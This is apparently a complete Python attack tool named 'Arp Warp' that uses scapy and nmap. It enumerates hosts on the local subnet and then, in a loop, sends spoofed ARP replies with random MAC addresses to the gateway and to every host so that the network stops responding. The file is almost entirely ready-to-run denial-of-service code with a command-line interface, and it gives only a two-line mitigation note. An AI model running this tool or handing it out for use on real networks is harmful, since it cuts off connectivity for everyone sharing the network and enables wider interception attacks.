import argparse
import logging
import ipaddress
import nmap
from typing import List

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings
# TODO must ifconfig
# TODO nmap elegantly
# TODO gateway auto
# TODO test on ipv6 at home
# TODO stats at first and then del lines output
# TODO refresh ipv6 scans for new devices
# TODO why only joannas iphone doesnt convert? (ans: fake mac? or: ans: diferent preflix)

# TODO note: just realized apple is using different MAC addr for every interface?
# SOLUTION: simply ping and wait for response then
from scapy.all import *
conf.verb = 0

#   --------------------------------------------------------------------------------------------------------------------
#
#   Arp Warp attack - Continuously poison the ARP cache of all hosts on the connected network to make it unresponsive
#
#   Notes
#       * 
#
#   Mitigation
#       * Static ARP table
#       * Use IPv6
#
#   --------------------------------------------------------------------------------------------------------------------

banner = """
......_.........______........__.........____....
...../ \...____|    \ \....../ /___.____|    \...
..../   \.|  __|     \ \ /\ / /    |  __|     |..
.../ /.\ \| |  |  __/.\      /     | |..|  __/...
../_/...\_\_|..|_|.....\_/\_/.\____|_|..|_|......
"""


class ArpWarp:
    _P_TIMEOUT = 2
    _P_RETRY = 10

    _IPV6_LL_PREF = "fe80"
    _IPV6_LL_PREFLEN = 64

    def __init__(self, iface, cidr, s_time, gateway):
        print(f"[*] Setting up attacker...")

        self.network_interface = iface
        conf.iface = self.network_interface
        self.cidr_ipv4 = cidr
        self.arp_poison_interval = s_time

        self.my_private_ip = get_if_addr(self.network_interface)
        self.my_mac = get_if_hwaddr(self.network_interface)
        self.my_private_ipv6 = self.mac2ipv6(self.my_mac)

        self.subnet_ipv4 = self.my_private_ip.split(".")[:3]
        self.subnet_ipv4_sr = f"{'.'.join(self.subnet_ipv4)}.0/{self.cidr_ipv4}"

        self.gateway_ip = gateway or f"{'.'.join(self.subnet_ipv4)}.1"  # TODO not this way
        self.gateway_mac = getmacbyip(self.gateway_ip)
        self.gateway_ipv6 = self.mac2ipv6(self.gateway_mac)

        if not self.gateway_mac:
            raise Exception(f"[!] Unable to get gateway mac -> {self.gateway_ip}")

        self.host_ipv6s = self.get_all_hosts_ipv6()
        print(f"[*] Generated {len(self.host_ipv6s)} existing IPV6 host targets")
        self.host_ipv4s = [str(host_ip) for host_ip in ipaddress.IPv4Network(self.subnet_ipv4_sr) if
                           str(host_ip) != self.my_private_ip and str(host_ip) != self.gateway_ip]
        print(f"[*] Generated {len(self.host_ipv4s)} possible IPV4 host targets for subnet {'.'.join(self.subnet_ipv4)}.x")

        self.abort = False
        self.get_all_hosts_ipv6()

    def get_all_hosts_ipv6(self) -> List[str]:
        print("[*] Running NMAP for IPv6 -> MAC mapping, this may take a minute...")
        ipv6_list = list()
        nm = nmap.PortScanner()
        nm.scan(hosts=self.subnet_ipv4_sr, arguments="-sP -n")
        for host in nm.all_hosts():
            if host != self.my_private_ip and host != self.gateway_ip:
                try:
                    addr = self.mac2ipv6(nm[host]['addresses']['mac'])
                    ipv6_list.append(addr)
                    print(nm[host]['addresses']['mac'])
                    print(f"[+] Discovered IPV4 {host} -> IPV6 {addr}")
                except KeyError:
                    print(f"[!] Error getting MAC address for host {host}, try running with sudo")
                    exit(-1)
        print(nm.all_hosts())
        return ipv6_list

    def poison_arp(self):
        """
        * poison the gateway arp cache with a spoofed mac address for every possible host
        * poison every possible host with a spoofed mac address for the gateway
        """
        for host_ip in self.host_ipv4s:
            # poison gateways's arp cache
            arp_packet_gateway = ARP(op=2, psrc=host_ip, hwdst=self.gateway_mac, hwsrc=RandMAC(), pdst=self.gateway_ip)
            sendp(Ether() / arp_packet_gateway, iface=self.network_interface)

            # poison host's arp cache
            arp_packet_host = ARP(op=2, psrc=self.gateway_ip, hwsrc=RandMAC(), pdst=host_ip)
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / arp_packet_host, iface=self.network_interface)

    def start_attack(self):
        loop_count = 0
        while not self.abort:
            try:
                loop_count += 1
                self.poison_arp()
                print(f"[*] Finished attack loop -> {loop_count}")
                time.sleep(self.arp_poison_interval)
            except Exception as exc:
                print(f"[!] Exception caught -> {exc}")
                self.abort = True
            except KeyboardInterrupt:
                print(f"[*] User requested to stop...")
                self.abort = True

    @staticmethod
    def mac2ipv6(mac):
        m = hex(int(mac.translate(str.maketrans('', '', ' .:-')), 16) ^ 0x020000000000)[2:]
        return 'fe80::%s:%sff:fe%s:%s' % (m[:4], m[4:6], m[6:8], m[8:12])


if __name__ == "__main__":
    print(f"\n{banner}\nWritten by @flashnuke\n{'=' * 49}")
    parser = argparse.ArgumentParser(description=f'Perform an ARP cache poison attack',
                                     usage=f"./{os.path.basename(__file__)} iface")
    parser.add_argument("-i", "--network-interface", dest='iface', type=str, metavar=(""),
                        help="the name of the network interface (from `ifconfig`, i.e -> 'eth0')",
                        required=True)

    parser.add_argument("-m", "--set-mask", dest='mask', type=int, metavar=(""), default=24,
                        help="set the mask range (default -> /24 which means 0-256",
                        required=False)

    parser.add_argument("-s", "--sleep-interval", dest='s_time', type=int, metavar=(""), default=1,
                        help="set the sleep time between each arp poison attempt (default -> 1[sec])",
                        required=False)

    parser.add_argument("-g", "--set-gateway", dest='gateway', type=str, metavar=(""), default=None,
                        help="set the gateway ip manually (defaults to x.x.x.1)",
                        required=False)
    arguments = parser.parse_args()

    warper = ArpWarp(arguments.iface, arguments.mask, arguments.s_time, arguments.gateway)
    warper.start_attack()
